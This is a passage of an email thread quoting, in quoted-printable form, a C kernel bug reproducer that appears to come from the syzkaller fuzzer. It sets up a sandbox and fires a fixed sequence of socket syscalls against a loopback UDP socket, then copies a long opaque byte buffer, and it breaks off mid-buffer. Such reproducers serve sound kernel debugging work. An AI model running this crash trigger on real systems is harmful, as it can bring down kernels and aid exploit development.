> >>   {                                                                   =
 \
> >>     __atomic_fetch_add(&skip_segv, 1, __ATOMIC_SEQ_CST);              =
 \
> >>     if (_setjmp(segv_env) =3D=3D 0) {                                 =
     \
> >>       __VA_ARGS__;                                                    =
 \
> >>     }                                                                 =
 \
> >>     __atomic_fetch_sub(&skip_segv, 1, __ATOMIC_SEQ_CST);              =
 \
> >>   }
> >>
> >> #define BITMASK_LEN(type, bf_len) (type)((1ull << (bf_len)) - 1)
> >>
> >> #define BITMASK_LEN_OFF(type, bf_off, bf_len)                         =
 \
> >>   (type)(BITMASK_LEN(type, (bf_len)) << (bf_off))
> >>
> >> #define STORE_BY_BITMASK(type, addr, val, bf_off, bf_len)             =
 \
> >>   if ((bf_off) =3D=3D 0 && (bf_len) =3D=3D 0) {                       =
         \
> >>     *(type*)(addr) =3D (type)(val);                                   =
   \
> >>   } else {                                                            =
 \
> >>     type new_val =3D *(type*)(addr);                                  =
   \
> >>     new_val &=3D ~BITMASK_LEN_OFF(type, (bf_off), (bf_len));          =
   \
> >>     new_val |=3D ((type)(val)&BITMASK_LEN(type, (bf_len))) << (bf_off)=
;  \
> >>     *(type*)(addr) =3D new_val;                                       =
   \
> >>   }
> >>
> >> static uintptr_t execute_syscall(int nr, uintptr_t a0, uintptr_t a1,
> >>                                  uintptr_t a2, uintptr_t a3,
> >>                                  uintptr_t a4, uintptr_t a5,
> >>                                  uintptr_t a6, uintptr_t a7,
> >>                                  uintptr_t a8)
> >> {
> >>   switch (nr) {
> >>   default:
> >>     return syscall(nr, a0, a1, a2, a3, a4, a5);
> >>   }
> >> }
> >>
> >> static void setup_main_process()
> >> {
> >>   struct sigaction sa;
> >>   memset(&sa, 0, sizeof(sa));
> >>   sa.sa_handler =3D SIG_IGN;
> >>   syscall(SYS_rt_sigaction, 0x20, &sa, NULL, 8);
> >>   syscall(SYS_rt_sigaction, 0x21, &sa, NULL, 8);
> >>   install_segv_handler();
> >>
> >>   char tmpdir_template[] =3D "./syzkaller.XXXXXX";
> >>   char* tmpdir =3D mkdtemp(tmpdir_template);
> >>   if (!tmpdir)
> >>     fail("failed to mkdtemp");
> >>   if (chmod(tmpdir, 0777))
> >>     fail("failed to chmod");
> >>   if (chdir(tmpdir))
> >>     fail("failed to chdir");
> >> }
> >>
> >> static void loop();
> >>
> >> static void sandbox_common()
> >> {
> >>   prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
> >>   setpgrp();
> >>   setsid();
> >>
> >>   struct rlimit rlim;
> >>   rlim.rlim_cur =3D rlim.rlim_max =3D 128 << 20;
> >>   setrlimit(RLIMIT_AS, &rlim);
> >>   rlim.rlim_cur =3D rlim.rlim_max =3D 1 << 20;
> >>   setrlimit(RLIMIT_FSIZE, &rlim);
> >>   rlim.rlim_cur =3D rlim.rlim_max =3D 1 << 20;
> >>   setrlimit(RLIMIT_STACK, &rlim);
> >>   rlim.rlim_cur =3D rlim.rlim_max =3D 0;
> >>   setrlimit(RLIMIT_CORE, &rlim);
> >>
> >>   unshare(CLONE_NEWNS);
> >>   unshare(CLONE_NEWIPC);
> >>   unshare(CLONE_IO);
> >> }
> >>
> >> static int do_sandbox_setuid(int executor_pid, bool enable_tun)
> >> {
> >>   int pid =3D fork();
> >>   if (pid)
> >>     return pid;
> >>
> >>   sandbox_common();
> >>
> >>   const int nobody =3D 65534;
> >>   if (setgroups(0, NULL))
> >>     fail("failed to setgroups");
> >>   if (syscall(SYS_setresgid, nobody, nobody, nobody))
> >>     fail("failed to setresgid");
> >>   if (syscall(SYS_setresuid, nobody, nobody, nobody))
> >>     fail("failed to setresuid");
> >>
> >>   loop();
> >>   doexit(1);
> >> }
> >>
> >> long r[55];
> >> void* thr(void* arg)
> >> {
> >>   switch ((long)arg) {
> >>   case 0:
> >>     r[0] =3D
> >>         execute_syscall(__NR_mmap, 0x20000000ul, 0x9c9000ul, 0x3ul,
> >>                         0x32ul, 0xfffffffffffffffful, 0x0ul, 0, 0, 0);
> >>     break;
> >>   case 1:
> >>     r[1] =3D execute_syscall(__NR_socket, 0x2ul, 0x2ul, 0x0ul, 0, 0, 0=
, 0,
> >>                            0, 0);
> >>     break;
> >>   case 2:
> >>     r[2] =3D execute_syscall(__NR_dup2, r[1], r[1], 0, 0, 0, 0, 0, 0, =
0);
> >>     break;
> >>   case 3:
> >>     NONFAILING(*(uint32_t*)0x20548ffc =3D (uint32_t)0x906);
> >>     r[4] =3D execute_syscall(__NR_setsockopt, r[1], 0x1ul, 0x6ul,
> >>                            0x20548ffcul, 0x4ul, 0, 0, 0, 0);
> >>     break;
> >>   case 4:
> >>     NONFAILING(*(uint16_t*)0x204de000 =3D (uint16_t)0x2);
> >>     NONFAILING(*(uint16_t*)0x204de002 =3D (uint16_t)0x204e);
> >>     NONFAILING(*(uint32_t*)0x204de004 =3D (uint32_t)0x100007f);
> >>     NONFAILING(*(uint8_t*)0x204de008 =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x204de009 =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x204de00a =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x204de00b =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x204de00c =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x204de00d =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x204de00e =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x204de00f =3D (uint8_t)0x0);
> >>     r[16] =3D execute_syscall(__NR_bind, r[2], 0x204de000ul, 0x10ul, 0=
, 0,
> >>                             0, 0, 0, 0);
> >>     break;
> >>   case 5:
> >>     NONFAILING(*(uint16_t*)0x209c4ff0 =3D (uint16_t)0x2);
> >>     NONFAILING(*(uint16_t*)0x209c4ff2 =3D (uint16_t)0x224e);
> >>     NONFAILING(*(uint32_t*)0x209c4ff4 =3D (uint32_t)0xffffffff);
> >>     NONFAILING(*(uint8_t*)0x209c4ff8 =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x209c4ff9 =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x209c4ffa =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x209c4ffb =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x209c4ffc =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x209c4ffd =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x209c4ffe =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x209c4fff =3D (uint8_t)0x0);
> >>     r[28] =3D execute_syscall(__NR_sendto, r[1], 0x201cc000ul, 0x0ul,
> >>                             0x8000ul, 0x209c4ff0ul, 0x10ul, 0, 0, 0);
> >>     break;
> >>   case 6:
> >>     NONFAILING(*(uint16_t*)0x20994000 =3D (uint16_t)0x2);
> >>     NONFAILING(*(uint16_t*)0x20994002 =3D (uint16_t)0x204e);
> >>     NONFAILING(*(uint32_t*)0x20994004 =3D (uint32_t)0x100007f);
> >>     NONFAILING(*(uint8_t*)0x20994008 =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x20994009 =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x2099400a =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x2099400b =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x2099400c =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x2099400d =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x2099400e =3D (uint8_t)0x0);
> >>     NONFAILING(*(uint8_t*)0x2099400f =3D (uint8_t)0x0);
> >>     r[40] =3D execute_syscall(__NR_connect, r[2], 0x20994000ul, 0x10ul=
, 0,
> >>                             0, 0, 0, 0, 0);
> >>     break;
> >>   case 7:
> >>     NONFAILING(*(uint64_t*)0x209c8fc8 =3D (uint64_t)0x2083efff);
> >>     NONFAILING(*(uint32_t*)0x209c8fd0 =3D (uint32_t)0x0);
> >>     NONFAILING(*(uint64_t*)0x209c8fd8 =3D (uint64_t)0x209c8ff0);
> >>     NONFAILING(*(uint64_t*)0x209c8fe0 =3D (uint64_t)0x1);
> >>     NONFAILING(*(uint64_t*)0x209c8fe8 =3D (uint64_t)0x209c8000);
> >>     NONFAILING(*(uint64_t*)0x209c8ff0 =3D (uint64_t)0x0);
> >>     NONFAILING(*(uint32_t*)0x209c8ff8 =3D (uint32_t)0xfffffffffffff7fd=
);
> >>     NONFAILING(*(uint64_t*)0x209c8ff0 =3D (uint64_t)0x209c1000);
> >>     NONFAILING(*(uint64_t*)0x209c8ff8 =3D (uint64_t)0x0);
> >>     r[50] =3D execute_syscall(__NR_recvmsg, r[1], 0x209c8fc8ul, 0x100u=
l,
> >>                             0, 0, 0, 0, 0, 0);
> >>     break;
> >>   case 8:
> >>     NONFAILING(*(uint32_t*)0x20103ffc =3D (uint32_t)0x19fe);
> >>     r[52] =3D execute_syscall(__NR_setsockopt, r[1], 0x1ul, 0x25ul,
> >>                             0x20103ffcul, 0x4ul, 0, 0, 0, 0);
> >>     break;
> >>   case 9:
> >>     NONFAILING(memcpy(
> >>         (void*)0x209c3000,
> >>         "\x97\x38\xd2\x89\x33\x60\xcc\x30\x6c\xd6\x3c\xf6\xf5\x1d\x0d"
> >>         "\x94\x09\x0b\xc8\x7a\x8d\xb3\x14\xa9\x6d\xec\x1b\xf0\x54\xe4"
> >>         "\xfc\x7a\xcc\x87\x23\x18\xc9\x96\x11\x5b\x47\x27\x36\x0c\x63"
> >>         "\x1b\xcb\x22\xf0\x7a\xd5\x13\x87\xbc\xa3\x4c\x27\x94\x9b\x81"
> >>         "\x8c\x29\x44\x18\x28\xd5\x8b\x0e\xba\xaa\x05\x0b\x74\x00\x63"
> >>         "\x9d\xf4\xb4\x27\xbd\xb4\x8e\xab\x60\x8e\x89\x4c\xf0\x38\x8a"
> >>         "\x1a\x3a\xb5\x1f\xb2\x99\x1d\x20\xdd\x45\xc9\x99\x04\xd0\x51"
> >>         "\x9f\x83\xfb\x3e\xfb\xdf\x5b\x33\x9c\x9c\x0e\x88\x1d\x89\x5e"
> >>         "\x57\xdb\xb4\xb9\x14\x2a\xe1\x54\xb3\x33\xe8\xde\xd7\x1c\x9a"
> >>         "\x32\xed\x58\xe5\x92\x2d\x2c\xf6\x48\xa6\x5d\x9f\xf6\x91\xea"
> >>         "\xa3\x95\x5a\xa1\xca\xdd\xb2\xe9\x00\xbf\x9a\xee\x42\xae\x33"
> >>         "\xc5\x5a\x1e\xfb\x9f\x81\xe4\x52\x0f\x0c\xee\xcc\x62\xc3\xfb"
> >>         "\xa8\x9d\x16\x24\xd8\xd1\x98\xae\x39\x4d\xce\xfd\xe6\x20\xc7"
> >>         "\xdc\x87\xd7\x09\x6d\x1c\x60\x19\x1f\x16\x0a\xae\x87\xb9\xbc"
> >>         "\xd1\x72\xf3\xa4\xcd\x6e\x1e\xca\x6e\x6d\x28\xfc\xaa\xdf\x85"
> >>         "\xd3\x73\xa0\x06\x00\x1a\x8e\x1d\x08\xfd\xc0\x64\x4a\x5d\x1e"
> >>         "\x52\xd8\x86\xd7\x5e\xdf\xd6\x1a\x5c\xc5\x5a\x3a\xcc\xb2\x30"
> >>         "\x70\x9a\x91\x29\x63\xf3\x69\x92\xfd\x65\x0a\x8e\x01\x4a\x4b"
> >>         "\xd0\x3c\xa5\x7b\x79\x5d\x31\x4a\x4c\x82\xdd\x17\xed\x08\xca"
> >>         "\x49\xde\x68\x24\xeb\x65\xb2\x3e\x31\x97\x7b\xf2\x6f\xe8\xed"
> >>         "\xd3\xb5\xc7\x27\x6c\x28\x38\x9a\x4e\x75\xbc\x25\xc1\x0f\x26"
> >>         "\x8b\xe2\x07\x68\xed\xd9\xe0\xfc\x9b\x10\x3f\xc1\x43\x81\xe3"
> >>         "\xf2\x9e\x45\x02\xb5\x00\x98\x91\x20\x70\x27\xc3\xf0\x6b\x5f"
> >>         "\xbd\x84\x52\x15\xb2\x55\x94\xd9\xf8\xdb\x9a\x8d\x77\xf5\x11"
> >>         "\x10\x79\x5c\xc4\x0e\xad\x2f\x4c\x72\x43\x7c\x34\x36\xc8\x78"
> >>         "\xf9\x50\x37\x8d\x14\x1d\x0e\xf3\x8e\xc9\x5d\x60\x8b\x7e\x0c"
> >>         "\xf0\xbf\xc7\x7a\x40\xb1\x08\xf0\x45\x89\x9d\xa9\x08\xb6\xe7"
> >>         "\x22\x2a\xed\xc0\x0d\x23\xd1\x31\xb4\x39\xeb\xec\xcf\xd2\xd4"
> >>         "\xa6\x59\xe2\x2f\xc0\x07\x91\x21\x79\xc2\xc3\x10\xe7\xed\xc7"
> >>         "\xd8\x9b\x8a\xde\x98\x34\x4d\xea\xea\x0c\x23\xe6\xbe\x6e\xc7"
> >>         "\x4d\x50\xb8\xdf\x80\x7d\xb3\x5d\xfc\x77\xd0\x70\xa9\xa3\x36"
> >>         "\xff\x54\xc9\xb4\xf1\x57\x83\x8b\x16\x9e\x54\x3d\x11\xd3\x96"
> >>         "\xdb\x96\xc6\xf1\x60\x04\x58\xb5\xc5\x01\x38\x64\x82\x46\x03"
> >>         "\x65\x18\x50\x43\x34\xd9\x9d\xa6\x34\x6e\xee\x8f\x75\x29\x03"
> >>         "\x6e\x4f\xb8\xd6\xe1\xb5\x6c\xe9\x92\xbd\xaf\x57\x31\xff\x1a"
> >>         "\xe6\xc3\x9d\xae\x08\x23\xde\x6a\x19\xfa\x55\x90\x11\xf3\x23"
> >>         "\x3a\x81\xd2\x15\xc8\x9b\xb0\x86\xb8\x0f\x8a\x48\x98\x56\x58"
> >>         "\x3b\x87\x92\x2b\xe8\x68\x6a\x41\x06\x12\x02\x21\x4f\xb6\x4f"
> >>         "\xf0\x1c\x0f\x6f\xe3\x9e\x78\x65\x90\x6e\xaa\x48\x59\x23\x99"
> >>         "\xa8\xf7\x7c\x85\x26\xec\x36\x92\x50\xe0\xbc\x82\xde\xb5\x01"
> >>         "\xc8\xb1\xa4\x1b\xc1\x22\xee\x4d\x38\x6b\x1a\x53\xd1\xf4\xf4"
> >>         "\x5c\x42\x9b\xb3\x79\x6f\x23\x46\x5e\x9f\xa2\x73\x68\x4d\xa1"
> >>         "\x20\x63\xfe\x2b\x69\xb1\xa8\x0a\x27\xfc\xd3\x96\x5c\x45\xca"
> >>         "\x48\x24\xbf\x21\x87\x44\xf0\x2f\xe8\x30\xe3\x09\x9f\x71\xe7"
> >>         "\x47\x21\x58\x18\x54\x62\xfb\xcc\xda\x4c\x09\x6e\x5f\x29\xb7"
> >>         "\xc2\x61\xec\x2e\x9e\xee\x23\xab\x18\x85\x59\x71\xee\x79\x98"
> >>         "\x2f\x60\x5d\xf2\x49\x1b\xb9\xdb\x42\x47\x40\x2c\x5c\xe1\x31"
> >>         "\xc5\x33\x91\x72\x9f\x5a\x2f\x38\xb7\x48\x28\xe5\xeb\x7e\x1a"
> >>         "\x5b\x0b\xd6\xd6\x6e\x41\x3d\xd8\x59\x68\x16\x10\xa1\xb2\xc5"
> >>         "\x5c\xd7\x1f\xdd\x2b\xe5\x4e\x23\x44\xdb\x70\xa8\xcc\x81\x34"
> >>         "\x5a\x79\xf4\x7a\x8c\x57\xdc\x04\x99\xb2\x57\x90\xdf\xeb\x4e"
> >>         "\x82\x06\x9e\x54\x5b\xff\x76\xfa\x33\xbc\xa1\xd4\xef\xd3\xe1"
> >>         "\x84\x36\xf2\x3b\xb1\x7b\xd1\x8a\x53\x83\x0e\x6b\x8f\x48\x05"
> >>         "\x6a\x4d\xe9\xe4\xa9\xbd\x75\xe4\xaa\xb6\x73\x86\x17\xb6\xa9"
> >>         "\x31\x0a\x2e\xe8\x09\x8c\xd1\x9a\x0e\xa4\x2a\x85\x7e\xa8\x13"
> >>         "\x07\xc4\x80\x38\x31\x72\xb1\xbc\xdc\x0b\x47\x07\x2c\x90\x3e"
> >>         "\x57\xb3\x10\x55\x66\x6c\x8d\x36\x76\xfe\x3c\xee\x4d\x81\x63"
> >>         "\xb6\xe9\xf4\xe3\xc4\x2f\xb5\x97\x86\xc8\xbc\xb4\xd4\x26\x15"
> >>         "\xdc\x1b\x0c\x57\xb3\xef\x66\x92\x5e\x94\xc8\xb2\xc9\x4b\x9e"
> >>         "\x1e\x76\xd1\x74\x30\xa4\x7e\xc3\x4e\x8c\x6b\x4a\x05\x55\xb1"
> >>         "\x9a\xe4\x1d\x12\xd2\xe6\x19\x3d\x66\x70\x32\x94\x24\x0b\x31"
> >>         "\xab\xbb\x86\x6d\xe6\xcf\x47\x12\x26\xf7\x98\xd6\x0a\xc4\x05"
> >>         "\x3a\x82\x27\x09\x65\xda\xfb\x46\x00\x40\xcf\x90\x4c\xa2\xff"
> >>         "\x7f\x9a\xde\x86\x51\x58\x8d\x5b\x72\x75\xc1\xca\xda\xed\x4b"
> >>         "\xe7\x55\x32\xbd\xd8\x53\x04\x59\x94\x16\x9f\x50\x28\x70\x78"
> >>         "\xcf\x2b\xad\xf9\x69\x5a\xea\x98\xab\x67\xc5\xcb\x66\x37\xd9"
> >>         "\x7a\x48\x77\xbb\x96\x54\xe2\x5e\x01\x04\x52\x99\x19\x1e\x01"
> >>         "\xe7\x3c\x62\x05\xe0\xd5\xc5\x4e\x10\x3c\xe3\x52\xff\x41\xda"
> >>         "\x80\xba\x1f\x46\x49\xc6\x4f\x33\xb0\xbf\x33\x5a\xba\xe9\xb1"
> >>         "\x59\xae\x12\x93\xed\x8b\x1b\x34\x9a\x01\xd8\xcc\xf0\xef\xbe"
> >>         "\xd9\xdf\x04\x6b\xf5\x60\x02\xff\xcc\x8a\x69\xd4\x00\xc1\xc8"
> >>         "\x8b\xbf\xd5\xdb\xf6\x8d\x1b\xa8\x11\x3f\x98\x9b\x0d\xf7\x12"
> >>         "\x2e\x55\xfe\x6f\x1b\x01\x7f\xe4\x22\x97\x8c\x6e\xa8\x83\x3b"
> >>         "\x43\xa9\x4c\x6c\x47\xc6\x3b\x97\x8b\x02\x00\x10\xe4\xe5\xad"
> >>         "\x61\xfe\x2c\xe6\x28\x3a\x59\xd5\xbb\x46\x0c\x58\xb3\xa8\xd7"
> >>         "\xe0\x3e\x12\x0d\x1a\xf3\xfe\xab\xf2\x52\x45\x8f\xeb\x9a\x1f"
> >>         "\xed\x21\x6b\x6d\x2d\xff\x7a\xed\x71\x38\xa7\x27\x30\x78\x38"
> >>         "\x81\x5b\x28\x66\x0e\x28\xcc\x6b\x2c\x10\xef\x36\xf4\xd5\x8b"
> >>         "\x0c\x67\xb4\xbb\x33\xd3\x61\xc3\x03\x28\xad\x4a\x0e\xab\xf9"
> >>         "\xb4\x7a\xdc\xf3\x15\xaa\x07\x8e\xc7\xc4\x97\x4d\xe4\xcf\x69"
> >>         "\x5a\xa4\xc2\xbd\x60\xdd\x0a\x2d\x8b\xa0\x61\xc2\x62\xbd\xdd"
> >>         "\x84\x0d\x1a\xd3\x6c\xd2\x7b\xae\x9b\x29\x0f\xec\xe5\xe4\x11"
> >>         "\x39\x8d\xed\x5a\xbe\x7f\x5e\xf8\xb6\x03\x85\xfe\xc7\x48\x5b"
> >>         "\x1c\x6c\x4b\x66\x81\xf3\xc4\xb1\x7e\xaa\xba\x32\xab\xb6\xfb"
> >>         "\x4e\x67\xbc\x83\xe7\xe8\xa3\xde\x76\x3b\x76\x56\x67\x4d\x66"
> >>         "\xf4\x6b\x0b\x55\x9c\x8c\xbc\xa3\x37\xb2\x7d\xae\x2a\x07\xfd"
> >>         "\x17\xc7\x33\xf1\xa9\x99\xde\x79\x27\xac\x25\xf9\xda\xec\x36"
> >>         "\xfc\x30\xf2\x85\x0a\xf3\xc4\xb3\xbe\xad\xa6\x39\x5c\x08\x04"
> >>         "\xa7\x37\xe7\xbf\xca\x83\x86\x50\x6c\xd9\xd5\x3b\xcb\xa7\xad"
> >>         "\x59\x2a\xdf\x9c\x61\x87\xa0\x52\x65\x3a\x86\x3d\x24\xe6\xbf"
> >>         "\x51\xd2\x82\xd7\x21\x7f\xa3\x75\x7b\x74\x5f\xae\xef\x69\x72"
> >>         "\x41\x35\x92\xd4\x88\x37\xba\xc9\xcd\xd9\xeb\xe6\x01\x77\x0b"
> >>         "\x17\xa2\x4f\x36\xed\xff\xc7\xad\x70\x4b\x10\x6d\xc1\xde\xe3"
> >>         "\x07\x2b\xe6\x4b\xcd\x5a\x12\x85\x40\xe7\x8f\x9c\x0f\xbb\x74"
> >>         "\x95\x50\x93\x74\x39\x21\x16\x5f\x09\xa9\xd6\x7a\xc4\x79\xc2"
> >>         "\x3e\x1c\x63\x07\xd9\xd0\x7a\x16\xed\x4d\xa4\x5d\x83\xa0\xf3"
> >>         "\xd0\xe0\xd3\x13\x94\x45\xf9\x8a\x87\x72\x18\x6a\x95\x3b\x80"
> >>         "\x84\xa9\x35\xa2\xc7\x5d\x56\xcb\x94\xfb\x71\x8b\xf3\x4d\xe4"
> >>         "\x6b\x97\x25\x0f\x78\xe8\xd2\x3d\xf8\x16\x85\x3e\x8f\xc7\x54"
> >>         "\xc1\x52\xa5\x36\xd6\x65\x71\x8a\x48\x4c\x23\xcb\xce\x8d\xaf"
> >>         "\x33\x70\x7c\x83\x92\x42\x0c\x58\x64\x7b\x0a\x89\xea\x9e\x3b"
> >>         "\x2e\xb8\x8e\xb0\x91\x57\x97\x2c\xae\x4b\x1e\x64\x7a\x01\x45"
> >>         "\xd2\xad\x93\x25\x72\x81\x89\x21\x6a\xca\xe7\xdb\x16\x72\x9c"
> >>         "\x67\x8e\x35\x84\xb7\xad\x55\x1b\x27\x9b\x2a\x89\x0a\x0a\x0a"
> >>         "\x9d\x7c\xbe\xe2\xa2\x20\x3d\x90\xef\x11\x36\xff\x00\x2a\x53"
> >>         "\x6f\x02\xd6\x4c\x25\x62\xfd\xda\x18\x72\xad\x28\x07\x91\xd2"
> >>         "\x08\x70\xc9\x73\x9d\x1e\x98\x45\xcb\xfd\x0c\x02\x2d\xb8\x9a"
> >>         "\xcd\xac\x00\xf2\x43\xfd\x9d\x48\xc4\x03\x58\x46\x10\x4c\x8c"
> >>         "\x34\x22\xa3\xa3\xd1\xc4\xb1\xa1\x39\xc3\xbc\xc4\x3a\xae\xe2"
> >>         "\x9f\x28\xa6\x9c\xf0\x7b\x85\xe1\xe5\xcc\x5d\xbb\x65\x07\x1a"
> >>         "\x9c\x78\xe4\xe4\x92\x3e\xf4\xc7\xdf\xcc\x19\x65\xac\x13\x6c"
> >>         "\x8e\x68\x4c\xdb\x2c\xa7\x13\x59\x1a\xe8\x61\x36\x75\xab\x45"
> >>         "\xff\x03\x0d\x31\x5e\x8a\x87\x67\x77\x14\xce\x25\xaa\x56\x5f"
> >>         "\xe7\x11\x4e\xad\xc5\xe6\x42\x1d\x7a\xc6\x82\x34\x14\xdf\xf5"
> >>         "\x0e\xa2\xf3\xe1\xc4\xb9\xc1\xf6\x43\x26\x71\xb0\xac\x71\x3f"
> >>         "\x50\x81\x8d\xdd\x5d\xde\x7a\xa7\x9b\x69\xd8\xaf\xef\x6f\x37"
> >>         "\xe6\x9f\x29\xfb\x82\xc0\x2e\x66\x09\x3d\xaa\x26\x16\xff\x2c"
> >>         "\x01\x00\xfc\xe9\x83\x1e\x6f\x58\xc1\x99\xf1\x57\x75\xf0\x36"
> >>         "\xfa\x9e\x9e\x6a\x65\x52\x0f\x9f\xaa\xc0\x14\x98\x4f\x6c\x4c"
> >>         "\xed\xc6\xe9\x78\xc7\x39\xa9\x46\xd1\x74\x1f\xc3\xf5\x26\xf3"
> >>         "\x41\xc5\xdd\x1f\x92\x62\x8e\xcc\x26\x4b\xde\xcb\xa7\xf1\x09"
> >>         "\xa1\x13\xfe\x29\xf1\xf3\x61\x3c\xbb\x6f\xef\x93\x6e\xa5\x38"
> >>         "\xa5\x34\x19\x89\x62\xa3\xf4\xdb\xad\x2b\xea\xad\x91\x95\xf8"
> >>         "\xb6\x00\xd8\x6d\xca\x1f\xa7\x41\xcf\x49\x40\x99\x65\x71\xd9"
> >>         "\x86\x3c\x8c\x3a\x1c\x80\x6e\xec\x85\x55\xc8\xb3\xe6\xb0\xe0"
> >>         "\xa4\xf3\x10\x23\x13\x4e\x58\x37\x69\xa8\x9e\x60\x90\x15\xea"
> >>         "\x47\xfe\x09\xe3\x4d\xaa\xa1\xe9\x8b\xe5\x93\xe3\x5d\x9b\x3e"
> >>         "\x62\x5b\x07\x99\x03\x92\xd2\xec\xac\x77\x67\xf0\xc0\x21\x6e"
> >>         "\x24\xb5\xc1\xd6\xd4\xec\xe8\x3a\x76\xdb\x86\xaa\x4f\x9f\xb6"
> >>         "\x18\xec\x42\xc9\x34\xf4\x89\x85\xd1\xf2\xf5\x7c\x70\x01\x89"
> >>         "\xdb\xe5\xcb\x5f\x1f\xf4\xf0\xb0\x5c\x0a\x3e\x98\x93\x72\x9a"
> >>         "\x26\xca\xbe\x96\x00\xb7\x20\x07\x1c\xd4\xf1\x03\xfd\x3d\xfe"
> >>         "\xe1\xb9\xe0\xf5\xa3\x6b\xed\xdc\x5b\x11\x2c\x31\x26\x39\x5d"
> >>         "\x1c\xbc\x50\xbe\x43\x6b\xc0\x65\x0a\x61\xf2\x69\xc4\xeb\x35"
> >>         "\x2f\x57\xc7\x82\xaf\xe5\x6f\x18\x10\xc1\xdb\x42\x5f\xc1\x86"
> >>         "\x1f\xa9\x02\x7b\xc5\x75\xab\xc2\x3b\xd2\x5f\x9b\x6a\x6b\x6e"
> >>         "\x62\x3d\xdb\x57\x22\x3e\x5d\x36\x33\xe3\xb2\x3f\x05\x0d\x23"
> >>         "\xd6\xde\x64\x58\x5b\x24\xf9\x4b\xe2\xdf\xe9\x99\xd1\x76\x8f"
> >>         "\x8a\x21\x65\xcd\xb9\x2a\x04\xfe\xfa\xb3\xdc\x9f\x33\xb1\x09"
> >>         "\xa0\x08\x8e\xe0\xa3\xc6\x7e\xb2\x45\x07\x73\x92\xd5\x60\x1e"
> >>         "\xb7\xf2\x5b\x70\x02\xa7\x38\x95\x13\x71\x5f\x40\x6d\xf6\x06"
> >>         "\xf6\x11\x03\x3f\x17\x77\xa8\xf8\xd8\x35\xf2\x60\xa1\xd8\xc5"
> >>         "\x14\xbc\xf8\xea\xb6\x8e\x80\xee\x2e\x02\x11\xf7\xd6\x51\xd4"
> >>         "\x51\x7a\xc8\x80\x09\x00\x00\x00\x01\x8d\xbc\x20\x56\xf3\x7c"
> >>         "\xb7\xb0\x14\xd1\x09\x14\xed\xeb\x27\x5f\xcc\x2e\x06\xd0\x73"
> >>         "\x4c\xac\x74\x62\x5b\x32\xec\x72\x95\xa9\x38\xd1\xda\x64\xca"
> >>         "\xd9\x93\x1c\x4c\xbc\x52\xa9\xdd\x5c\xb2\xae\x14\xf9\x1e\xef"
> >>         "\x1b\x9d\xc3\x1b\x1a\xfa\x63\x01\xa0\x89\x78\x15\xe0\x93\xc5"
> >>         "\x34\x05\xe1\x21\xf6\x18\xeb\x54\x16\x93\x53\x2e\xce\xf0\x3a"
> >>         "\xcd\x35\x56\xea\x05\x6d\x78\xa0\xe0\xc6\xa3\x0c\x50\x77\xe5"
> >>         "\xe3\x0a\x5c\x9c\x1e\xe8\x0f\x40\xe3\xd1\xc0\xee\x50\x21\xf8"
> >>         "\x05\x05\x77\x82\x69\x64\x2a\xd1\xd3\x0d\x41\x36\x08\x06\xc3"
> >>         "\xdf\xd4\x96\x66\xcd\x72\xc7\xd1\xdf\x7c\x49\x6f\x4c\x63\xaa"
> >>         "\xd7\xd6\x54\x45\x53\x58\xdb\xac\x87\xfa\x6f\x00\xb9\xa1\xb8"
> >>         "\xe4\x32\xf0\x97\x51\xba\x4c\x30\xe0\x51\x18\xf7\x9c\x73\x36"
> >>         "\x49\x33\x94\x86\x8b\xd6\x98\xac\xa5\x86\x29\x40\xbd\x64\x40"
> >>         "\x6d\xdf\x68\x39\x11\xd5\x05\x9f\xca\x2d\xf9\x7c\x73\x0b\x06"
> >>         "\x3d\xef\xb4\xc7\x1e\x8e\x0c\xa4\xc6\x7a\x9c\xc9\x25\xe2\xea"
> >>         "\x96\xfa\x0f\x0f\x67\x4b\xa7\xfc\x46\xd7\xff\x79\xc3\x6f\xdf"
> >>         "\x18\xb7\x1a\x8e\x60\x6f\x8b\x05\x3e\x91\x70\x9f\x6e\x9c\xa7"
> >>         "\x73\x4c\xe5\xd8\xb2\x1f\xde\xf8\x54\x5e\x0e\xc0\x65\x9f\xc4"
> >>         "\xfd\x9c\xb3\x1d\x22\xba\x89\xab\x97\xbe\xa4\xcd\x81\x1d\x5c"
> >>         "\x11\x63\x6b\x4a\x1f\xb9\x09\xae\x49\x07\x74\x89\x02\xc0\x09"
> >>         "\xb3\xfb\x5e\xf9\x3e\x0a\x5a\x12\x5f\xc5\xdf\x5f\xc8\xe0\x13"
> >>         "\xa9\xae\x0b\x72\xf9\x8d\x26\x42\x8f\x35\x17\x78\x32\x1c\x01"
> >>         "\x7f\x73\xb7\xcf\x84\x73\xfb\xbf\xee\x74\x25\xb3\xd7\xd0\x4d"
> >>         "\x59\x3c\x63\x94\x95\xf7\x0b\x3e\x16\xf5\x37\x64\x3e\xf5\x17"
> >>         "\x5a\xd5\xcd\xb0\x92\xf2\x28\x67\xc8\x7f\x39\xe4\x59\x76\xf8"
> >>         "\xfc\xef\x4c\xd4\xca\x7d\x0b\x42\x9d\xd1\x16\xb8\xbe\xa8\x28"
> >>         "\xc6\xfd\x7f\xaf\x55\x17\x38\x81\x51\x6d\x9b\x07\x01\xca\xbc"
> >>         "\xda\xf8\xb9\x5b\x44\x97\xf0\xa8\x58\x93\x30\xff\x70\x39\x1f"
